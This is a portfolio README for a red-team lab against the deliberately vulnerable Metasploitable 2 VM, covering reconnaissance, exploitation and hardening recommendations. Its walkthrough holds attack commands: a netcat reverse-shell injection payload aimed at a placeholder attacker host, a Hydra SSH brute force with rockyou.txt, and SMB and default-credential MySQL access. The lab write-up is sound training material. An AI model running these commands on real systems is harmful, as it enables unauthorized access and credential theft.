# Red Team Tactics & Exploitation Lab

[![Kali Linux](https://img.shields.io/badge/Attacker-Kali%20Linux-blue?logo=linux&logoColor=white)](https://www.kali.org/)
[![Metasploitable 2](https://img.shields.io/badge/Target-Metasploitable%202-red)](https://sourceforge.net/projects/metasploitable/)
[![Metasploit](https://img.shields.io/badge/Framework-Metasploit-purple)](https://www.metasploit.com/)
[![Nmap](https://img.shields.io/badge/Tool-Nmap-lightgrey)](https://nmap.org/)
[![Hydra](https://img.shields.io/badge/Tool-Hydra-orange)](https://github.com/vanhauser-thc/thc-hydra)
[![Category](https://img.shields.io/badge/Focus-Red%20Team%20%7C%20Offensive%20Security-black)]()

---

## <span style="color:#b83232">Executive Summary</span>

> A structured offensive security lab targeting **Metasploitable 2** using attacker tooling such as **Nmap, Metasploit, Hydra, Netcat**, and manual exploitation techniques.  
> This project demonstrates practical red team tradecraft across reconnaissance, exploitation, credential attacks, privilege escalation, and post-exploitation analysis.

---

## Table of Contents

- [Project Overview](#project-overview)
- [Why This Project Matters](#why-this-project-matters)
- [Technologies Used](#technologies-used)
- [Objectives](#objectives)
- [Key Achievements](#key-achievements)
- [Skills Demonstrated](#skills-demonstrated)
- [Attack Walkthrough (Optional)](#attack-walkthrough-optional)
- [Recommendations for Future Enhancements](#recommendations-for-future-enhancements)

---

## <span style="color:#b83232">Project Overview</span>

This project simulates a red team attack on **Metasploitable 2**, a purposefully vulnerable virtual machine used for cybersecurity training.  
Using **Kali Linux** as the attacker environment, the engagement includes:

- Service enumeration  
- Vulnerability discovery  
- Exploitation using Metasploit, manual methods, and brute-force utilities  
- Privilege escalation  
- Post-exploitation data extraction  
- Remediation recommendations  

The goal is to replicate realistic attacker behavior in order to understand, document, and mitigate common security failures.

---

## <span style="color:#b83232">Why This Project Matters</span>

- Demonstrates practical offensive security and exploitation methodology  
- Shows how misconfigurations and outdated software lead to real compromise  
- Highlights attacker workflows that defenders must detect and prevent  
- Builds competency across reconnaissance, exploitation, and reporting  
- Strengthens understanding of secure configuration and system hardening  

---

## <span style="color:#b83232">Technologies Used</span>

- **Kali Linux** – Attacker OS  
- **Metasploitable 2** – Vulnerable Linux target  
- **Nmap** – Service & vulnerability discovery  
- **Metasploit Framework** – Automated exploitation  
- **Hydra / Medusa** – Password brute-forcing  
- **Netcat, SSH, Python** – Post-exploitation tooling  

---

## <span style="color:#b83232">Objectives</span>

- Identify exploitable vulnerabilities in an intentionally insecure environment  
- Use common attacker tools to compromise Linux-based systems  
- Demonstrate brute-force credential attacks  
- Execute command injection, service exploitation, and database compromise  
- Document findings and provide actionable remediation recommendations  

---

## <span style="color:#b83232">Key Achievements</span>

- **Executed command injection attacks on a vulnerable web app**  
  *Achieved remote code execution and shell access via OS command injection.*

- **Exploited insecure SMB service configurations**  
  *Enumerated shares, accessed sensitive files, and harvested user information.*

- **Brute-forced SSH login using Hydra**  
  *Cracked weak credentials and gained unauthorized shell access.*

- **Compromised unsecured MySQL database**  
  *Connected using default credentials and extracted stored data.*

- **Identified 6+ additional vulnerabilities in outdated services**  
  *Discovered weak configurations in Apache, VSFTPD, OpenSSH, and Samba.*

---

## <span style="color:#b83232">Skills Demonstrated</span>

- **Penetration Testing Methodology**  
  *Recon → Enumeration → Exploitation → Post-Exploitation → Reporting*

- **Network & Service Enumeration**  
  *Used Nmap to identify open ports, service banners, and vulnerabilities.*

- **Exploitation & Payload Delivery**  
  *Leveraged Metasploit and manual techniques to compromise services.*

- **Credential Attacks**  
  *Performed dictionary attacks against SSH/FTP using Hydra.*

- **Post-Exploitation Enumeration**  
  *Extracted credentials, escalated privileges, and mapped system internals.*

- **Red Team Reporting & Remediation Guidance**  
  *Documented impact, exploited weaknesses, and recommended fixes.*

---

## <span style="color:#b83232">Attack Walkthrough (Optional)</span>

<details>
<summary><strong>Click to expand full walkthrough</strong></summary>

### 1. Reconnaissance
```bash
nmap -sV -O -p- 192.168.56.101
```
Identified outdated SSH, FTP, Apache, MySQL, and SMB services.

### 2. Web Command Injection
Exploited vulnerable form input to execute system commands:
```bash
; nc -e /bin/bash attacker_ip 4444
```

### 3. SMB Enumeration
```bash
smbclient -L //192.168.56.101/ -N
```
Accessed public shares and captured user lists.

### 4. Credential Brute-Force (Hydra)
```bash
hydra -l msfadmin -P rockyou.txt ssh://192.168.56.101
```

### 5. MySQL Compromise
Logged in using default credentials:
```bash
mysql -u root -h 192.168.56.101
```

### 6. Post-Exploitation
- Enumerated system users  
- Retrieved password hashes  
- Identified world-readable files  
- Verified SUID binaries for escalation paths  

</details>

---

## <span style="color:#b83232">Recommendations for Future Enhancements</span>

- **Patch and update vulnerable services**  
  Outdated Apache, VSFTPD, Samba, and OpenSSH should be upgraded to eliminate known CVEs.

- **Enforce strong authentication**  
  Strong passwords and MFA should be used for SSH and MySQL.

- **Restrict SMB access**  
  Disable anonymous login and limit share access to authorized users.

- **Secure MySQL configuration**  
  Require strong passwords, restrict remote connections, and encrypt sensitive data.

- **Audit sudo privileges & minimize services**  
  Remove unnecessary services and reduce root-level permissions.

- **Firewall hardening (iptables/ufw)**  
  Limit access to required ports only.

- **Add advanced techniques in future labs**  
  Internal pivoting, privilege escalation chains, anti-forensics, and evasion testing.

---

This project does not use an open-source license. All rights reserved.
